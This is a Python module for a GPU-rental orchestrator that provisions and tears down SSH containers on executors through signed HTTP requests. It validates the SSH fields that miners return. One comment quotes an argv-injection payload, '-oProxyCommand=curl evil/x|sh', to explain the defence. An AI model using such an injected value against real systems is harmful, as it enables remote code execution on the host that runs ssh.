"""
Rental orchestrator — provisions containers on executors via their HTTP API.

Flow:
1. Validator selects executor, marks rented on-chain (done in rent.py)
2. Orchestrator calls the executor's POST /containers endpoint
3. Executor creates Sysbox container with GPU passthrough + SSH
4. Orchestrator returns connection details to user

The executor daemon (neurons/executor/daemon.py) exposes:
  POST /containers  — creates a rental container
  DELETE /containers/{name} — destroys it

Every miner-bound request carries an SR25519 signature header derived
from the validator's hotkey seed (common.crypto.sign_payload). The
miner verifies against its allowlist; unsigned requests get a 401.
"""
from __future__ import annotations

import json as _json
import re
import time
import os
from dataclasses import dataclass
from typing import Optional

import aiohttp
import bittensor as bt

from common.crypto import sign_payload


# Strict character classes for fields that flow into ssh(1)'s argv. The
# miner returns ssh_user / ssh_port in its POST /containers response,
# and historically those flowed straight into `["ssh", "-p", port,
# f"{user}@{host}"]`. An attacker miner returning
# `ssh_user="-oProxyCommand=curl evil/x|sh"` lands the leading dash as
# an argv option — OpenSSH parses it as a flag and executes the proxy
# command on the VALIDATOR host. That is a remote code execution path
# against the validator from a miner we haven't even paid yet.
#
# Mitigations applied here:
#   * ssh_user must match _SAFE_SSH_USER_RE (no leading dash, no shell
#     metacharacters). Reject the rental result otherwise.
#   * ssh_port must be a real int in [1, 65535].
#   * ssh_host coming back from `urlparse(executor_endpoint).hostname`
#     is mostly trusted (chain-registered endpoint), but we still
#     validate the character class as defence-in-depth.
# Callers (canary runner, rent.py) MUST additionally pass `--` to ssh
# before the destination argv so option parsing is unambiguous.
_SAFE_SSH_USER_RE = re.compile(r"^[a-zA-Z0-9._][a-zA-Z0-9._-]{0,30}$")
_SAFE_SSH_HOST_RE = re.compile(r"^[a-zA-Z0-9.\-:\[\]]{1,253}$")  # IPv4/IPv6/DNS


def _validate_ssh_target(host: str, port: int, user: str) -> None:
    """Raise ValueError if any of (host, port, user) could exploit ssh(1)."""
    if not isinstance(port, int) or port < 1 or port > 65535:
        raise ValueError(f"ssh_port out of range or not int: {port!r}")
    if not (isinstance(user, str) and _SAFE_SSH_USER_RE.match(user)):
        raise ValueError(f"ssh_user fails validation: {user!r}")
    if not (isinstance(host, str) and _SAFE_SSH_HOST_RE.match(host)):
        raise ValueError(f"ssh_host fails validation: {host!r}")


@dataclass
class RentalResult:
    """Connection details returned to the user after provisioning."""
    ssh_host: str
    ssh_port: int
    ssh_user: str
    container_name: str
    executor_endpoint: str
    image: str = ""
    image_id: str = ""
    tcp_ports: list[int] = None


class RentalOrchestrator:
    """Provisions and destroys rental containers on executors.

    `hotkey_seed` is the validator's hotkey seed bytes (32B) — used to
    sign every miner request. If None, requests go out unsigned and the
    miner will 401 them (useful only for tests against an unauth'd miner).
    """

    def __init__(self, timeout: int | None = None, hotkey_seed: Optional[bytes] = None):
        if timeout is None:
            try:
                timeout = int(os.environ.get("RENTAL_ORCHESTRATOR_TIMEOUT_S", "180"))
            except ValueError:
                timeout = 180
        self._timeout = aiohttp.ClientTimeout(total=timeout)
        self._hotkey_seed = hotkey_seed

    def _signed_headers(self, body_bytes: bytes) -> dict[str, str]:
        """Compute SR25519 signature headers for a request body.

        Returns empty dict (and logs at debug) when no seed is configured,
        so dev runs against an unauthenticated miner still execute the
        request; the miner will then reject if it has auth turned on.
        """
        if not self._hotkey_seed:
            bt.logging.debug("orchestrator: no hotkey_seed; sending unsigned")
            return {}
        try:
            return sign_payload(body_bytes, self._hotkey_seed)
        except Exception as e:
            bt.logging.warning(f"orchestrator: sign_payload failed: {e}")
            return {}

    async def provision(
        self,
        executor_endpoint: str,
        ssh_pub_key: str,
        image: str = "ubuntu:22.04",
        gpu_uuids: Optional[list[str]] = None,
        gpu_count: int = 1,
        cpu_count: int = 4,
        memory_gb: int = 16,
        storage_gb: int = 100,
        ttl_seconds: int = 7200,
        require_image_cached: bool = True,
        pull_image: bool = False,
        image_pull_timeout_s: int = 1800,
        expose_tcp_ports: bool = True,
    ) -> RentalResult:
        """Provision a rental container on the executor.

        Calls the executor's POST /containers endpoint. The executor daemon
        handles Docker/Sysbox creation, GPU passthrough, and SSH setup.
        """
        container_name = f"nodexo-rental-{int(time.time())}"
        endpoint = executor_endpoint.rstrip("/")

        payload = {
            "name": container_name,
            "image": image,
            "gpu_uuids": gpu_uuids,
            "cpu_count": cpu_count,
            "memory_gb": memory_gb,
            "storage_gb": storage_gb,
            "ssh_pub_key": ssh_pub_key,
            "use_sysbox": True,
            "ttl_seconds": ttl_seconds,
            "require_image_cached": require_image_cached,
            "pull_image": pull_image,
            "image_pull_timeout_s": image_pull_timeout_s,
            "expose_tcp_ports": expose_tcp_ports,
        }

        # Serialize manually so we can sign the EXACT bytes the miner will
        # see. Letting aiohttp.json= re-serialize would invalidate the sig.
        body_bytes = _json.dumps(payload, separators=(",", ":")).encode()
        headers = {"content-type": "application/json"}
        headers.update(self._signed_headers(body_bytes))

        request_timeout = self._timeout
        if pull_image:
            request_timeout = aiohttp.ClientTimeout(
                total=max(int(self._timeout.total or 0), int(image_pull_timeout_s) + 180)
            )

        async with aiohttp.ClientSession(timeout=request_timeout) as session:
            url = f"{endpoint}/containers"
            bt.logging.info(f"Provisioning container on {url}")

            async with session.post(url, data=body_bytes, headers=headers) as resp:
                if resp.status != 200:
                    body = await resp.text()
                    raise RuntimeError(f"Container creation failed ({resp.status}): {body}")

                data = await resp.json()

        # Extract host from executor endpoint (e.g., "https://gpu1.example.com:8090" → "gpu1.example.com")
        from urllib.parse import urlparse
        parsed = urlparse(executor_endpoint)
        ssh_host = parsed.hostname or executor_endpoint

        ssh_port_raw = data.get("ssh_port", 0)
        try:
            ssh_port = int(ssh_port_raw)
        except (TypeError, ValueError):
            raise RuntimeError(
                f"Miner returned non-integer ssh_port: {ssh_port_raw!r}"
            )
        ssh_user = data.get("ssh_user", "root")
        tcp_ports = []
        for port in data.get("tcp_ports") or []:
            try:
                p = int(port)
            except (TypeError, ValueError):
                continue
            if 1 <= p <= 65535 and p != ssh_port:
                tcp_ports.append(p)

        # CRITICAL — argv-injection mitigation. If the miner returned
        # values that could land as ssh(1) options, fail the rental
        # rather than spawn a shell that respects them.
        try:
            _validate_ssh_target(ssh_host, ssh_port, ssh_user)
        except ValueError as e:
            raise RuntimeError(f"Miner returned unsafe SSH target: {e}")

        return RentalResult(
            ssh_host=ssh_host,
            ssh_port=ssh_port,
            ssh_user=ssh_user,
            container_name=container_name,
            executor_endpoint=executor_endpoint,
            image=str(data.get("image") or ""),
            image_id=str(data.get("image_id") or ""),
            tcp_ports=sorted(set(tcp_ports)),
        )

    async def add_ssh_key(
        self,
        executor_endpoint: str,
        container_name: str,
        ssh_pub_key: str,
    ) -> bool:
        """Append a pubkey to a live rental's container."""
        endpoint = executor_endpoint.rstrip("/")
        url = f"{endpoint}/containers/{container_name}/ssh_keys"
        payload = {"ssh_pub_key": ssh_pub_key}
        body_bytes = _json.dumps(payload, separators=(",", ":")).encode()
        headers = {"content-type": "application/json"}
        headers.update(self._signed_headers(body_bytes))
        try:
            async with aiohttp.ClientSession(timeout=self._timeout) as session:
                async with session.post(url, data=body_bytes, headers=headers) as resp:
                    if resp.status == 200:
                        return True
                    body = await resp.text()
                    bt.logging.warning(f"add_ssh_key failed ({resp.status}): {body}")
                    return False
        except Exception as e:
            bt.logging.error(f"add_ssh_key request error: {e}")
            return False

    async def remove_ssh_key(
        self,
        executor_endpoint: str,
        container_name: str,
        ssh_pub_key: str,
    ) -> bool:
        """Remove a pubkey from a live rental's container."""
        endpoint = executor_endpoint.rstrip("/")
        url = f"{endpoint}/containers/{container_name}/ssh_keys"
        payload = {"ssh_pub_key": ssh_pub_key}
        body_bytes = _json.dumps(payload, separators=(",", ":")).encode()
        headers = {"content-type": "application/json"}
        headers.update(self._signed_headers(body_bytes))
        try:
            # aiohttp's session.delete() doesn't accept `data=`; use the
            # generic request() so we can pass a DELETE body the same way.
            async with aiohttp.ClientSession(timeout=self._timeout) as session:
                async with session.request(
                    "DELETE", url, data=body_bytes, headers=headers,
                ) as resp:
                    if resp.status == 200:
                        return True
                    body = await resp.text()
                    bt.logging.warning(f"remove_ssh_key failed ({resp.status}): {body}")
                    return False
        except Exception as e:
            bt.logging.error(f"remove_ssh_key request error: {e}")
            return False

    async def list_containers(
        self,
        executor_endpoint: str,
    ) -> list[dict]:
        """Signed GET /containers — list every container the miner
        knows about for this executor.

        Used by the sybil scanner's `gpu_process_outside_rental` signal
        (audit-pattern): cross-check which docker container IDs are
        legitimate rentals vs unexpected. Returns [] on any failure so
        the caller treats it as "no info" rather than failing hard.
        """
        result = await self.list_containers_strict(executor_endpoint)
        return result if result is not None else []

    async def list_containers_strict(
        self,
        executor_endpoint: str,
    ) -> list[dict] | None:
        """Signed GET /containers with failure visibility.

        Returns:
          - list[dict] when the miner answered successfully
          - None when the request failed or the miner returned non-200

        This is intentionally separate from list_containers(): sybil
        correlation treats failures as "no info", while active-rental
        reconciliation must not count a transient miner/API failure as
        proof that the renter's container disappeared.
        """
        endpoint = executor_endpoint.rstrip("/")
        url = f"{endpoint}/containers"
        # Body for GET is empty; the SR25519 path signs over "" which
        # the miner accepts (matches our existing add_ssh_key pattern).
        headers = self._signed_headers(b"")
        try:
            async with aiohttp.ClientSession(timeout=self._timeout) as session:
                async with session.get(url, headers=headers) as resp:
                    if resp.status != 200:
                        bt.logging.debug(
                            f"list_containers {endpoint}: HTTP {resp.status}"
                        )
                        return None
                    return await resp.json()
        except Exception as e:
            bt.logging.debug(f"list_containers {endpoint}: {e}")
            return None

    async def get_port_status(self, executor_endpoint: str) -> dict:
        """Signed GET /ports — miner's rental SSH port pool."""
        endpoint = executor_endpoint.rstrip("/")
        url = f"{endpoint}/ports"
        headers = self._signed_headers(b"")
        try:
            async with aiohttp.ClientSession(timeout=self._timeout) as session:
                async with session.get(url, headers=headers) as resp:
                    if resp.status != 200:
                        body = await resp.text()
                        bt.logging.debug(
                            f"get_port_status {endpoint}: HTTP {resp.status}: {body[:200]}"
                        )
                        return {}
                    return await resp.json()
        except Exception as e:
            bt.logging.debug(f"get_port_status {endpoint}: {e}")
            return {}

    async def terminate(
        self,
        executor_endpoint: str,
        container_name: str,
    ) -> bool:
        """Destroy a rental container on the executor."""
        endpoint = executor_endpoint.rstrip("/")
        url = f"{endpoint}/containers/{container_name}"

        # DELETE has no body but the signature scheme still hashes
        # timestamp+nonce+body, so signing an empty payload is fine.
        headers = self._signed_headers(b"")

        try:
            async with aiohttp.ClientSession(timeout=self._timeout) as session:
                async with session.delete(url, headers=headers) as resp:
                    if resp.status == 200:
                        bt.logging.info(f"Container {container_name} destroyed on {endpoint}")
                        return True
                    body = await resp.text()
                    bt.logging.warning(f"Container destroy failed ({resp.status}): {body}")
                    return False
        except Exception as e:
            bt.logging.error(f"Failed to destroy container {container_name}: {e}")
            return False
